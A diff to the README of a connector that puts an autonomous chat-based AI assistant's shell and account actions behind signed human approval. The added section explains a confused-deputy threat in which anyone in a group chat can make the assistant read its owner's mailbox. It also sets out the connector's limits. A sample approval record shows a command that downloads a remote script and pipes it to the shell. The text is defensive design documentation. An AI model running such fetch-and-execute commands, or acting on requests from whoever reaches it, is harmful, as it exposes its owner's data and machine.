@@ -17,6 +17,95 @@ Repository description:
 
 OpenClaw is an open-source personal AI assistant that runs on your own machine, answers on the channels you already use (WhatsApp, Telegram, iMessage, Signal, Slack, and more), keeps persistent memory, browses the web, runs shell commands, manages email and calendar, and can write its own skills. It acts autonomously in the background. This connector governs what it is allowed to do.
 
+## The problem this solves
+
+You run OpenClaw as your assistant. You give it access to your mailbox, because
+you message it privately and you want it to handle your email. That works, and
+it is the reason you connected it.
+
+OpenClaw answers on the channels you already use, and one of them is a group: a
+project with a client, a trip with friends, a team channel. Somebody in that
+group messages the assistant.
+
+**It answers. It has no way to know the person asking is not you.** It performs
+the action with its own authority, so a request from the group and a request
+from your private thread look identical to it. Anyone in that group can now ask
+it what is in your mailbox. No permission was changed and nothing was inherited.
+The assistant simply answered the channel it was on.
+
+This is the confused deputy problem. It applies to any agent that more than one
+person can instruct while it holds standing access to one person's data. It is
+not a misconfiguration: it is what happens when the unit of authorization is the
+agent while the unit of exposure is the conversation.
+
+### Why a local install does not make this go away
+
+The bridge talks to OpenClaw over a local socket, as one operating system user,
+with no credential on disk where the assistant could read it. That is a real
+protection and it is worth having.
+
+**It protects the credential, not the instruction surface.** Who can reach the
+socket and who can message the assistant are different questions, and only the
+first one is answered by running locally. An assistant on your own laptop can
+still be sitting in a group chat.
+
+### How Contro1 solves it
+
+**1. An OpenClaw assistant is treated as reachable by people Contro1 cannot
+name.** The bridge cannot enumerate which channels are wired up or who is in
+them, so it does not pretend to. If your assistant genuinely has no chat
+channels, say so with `CONTRO1_OPENCLAW_REACH=private`. That is a claim with a
+person behind it, which is worth more than an inference with nobody behind it,
+and it is visible in the record.
+
+**2. An assistant other people can instruct cannot use a personal account on its
+own.** Organization accounts are unaffected: those are already bounded by a
+resource boundary somebody approved. The gate is specifically about one person's
+account being borrowed by software that answers to several. You can allow it
+anyway, and that decision is recorded with your name and the date.
+
+**3. Every request states who could have asked.** The reviewer sees it beside
+the command:
+
+```text
+requested_from   OpenClaw on workstation
+reachable_by     unknown: OpenClaw answers on chat channels this bridge
+                 cannot enumerate, so anyone on one of them may have asked
+command          curl -s https://example.com/report | sh
+```
+
+The command alone was never the whole question.
+
+**4. Not knowing is never read as safety.** Everything that cannot be
+established is stated in plain words and treated as exposure. Silence never
+earns privacy.
+
+### What this connector cannot secure, stated plainly
+
+Two things cannot be enforced here, and knowing which they are is worth more
+than a reassurance that covers them over.
+
+**It cannot tell which conversation an instruction came from.** OpenClaw answers
+on WhatsApp, Telegram, iMessage, Signal and Slack, any of which can be a group.
+The bridge sees an approval, not the channel it started in, and the fields an
+approval does carry (`sessionKey`, `host`, `cwd`) are best-effort projections
+that the CLI sanitizes, which is why this connector never makes a security
+decision from them. **Nothing here can be scoped to "only when I ask in my
+private chat."** An assistant that can use an account can be asked to use it by
+anyone who can reach the assistant.
+
+**It cannot tell who is on the other end.** There is no sender identity in the
+approval surface. A request from a colleague, from a client in a shared channel,
+and from you are indistinguishable by the time a reviewer sees them.
+
+What is enforced is unaffected by either: a command stops before it runs, a
+named person decides, the decision is bound to the exact command by a hash
+recomputed before it is applied, and the exchange is recorded. That is a
+different guarantee from knowing who asked, and it is the one on offer.
+
+> Where a limit exists, it is named here. A guardrail described as stronger than
+> it is does more damage than a missing one, because somebody plans around it.
+
 ## What this connector does
 
 This connector is the small server in this repository. You deploy it in your own environment as an OpenClaw **operator client**, running outside the gateway process. Instead of a human answering every `/approve` in chat, the bridge routes each pending approval to Contro1, waits for a signed decision, verifies it, and only then resolves the approval in OpenClaw. It also gives you a durable audit trail of the assistant's autonomous background work through an agent-side self-logging skill.
